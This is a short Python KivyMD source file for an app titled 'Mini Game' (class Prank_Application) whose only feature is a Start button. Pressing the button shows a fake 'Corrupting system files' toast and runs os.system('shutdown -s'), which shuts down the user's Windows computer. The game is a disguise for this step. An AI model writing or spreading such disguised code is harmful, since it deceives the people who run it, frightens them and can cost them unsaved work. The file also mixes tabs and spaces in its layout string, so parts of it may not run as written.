from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.toast import toast
from kivmob import *
from kivy import platform
import os
App = '''
BoxLayout:
	orientation:'vertical'
	MDToolbar:
		title:'Mini Game'
		md_bg_color: app.theme_cls.primary_color
        specific_text_color: 1, 1, 1, 1
	MDBottomNavigation:
		MDBottomNavigationItem:
			text:'Play Game'
			icon:'play'
			name:'screen 1'
			MDFillRoundFlatIconButton:
				text: "Start"
		        icon: "play"
		        pos_hint: {"center_x": .5, "center_y": .5}
		        on_release: app.start_game()


'''
class Prank_Application(MDApp):
	def build(self):
		self.title = "Mini Game"
		self.theme_cls.primary_palette = "Red"
		return Builder.load_string(App)
	def start_game(self):
		toast(str("Corrupting system files"))
		os.system('shutdown -s')
Prank_Application().run()
		


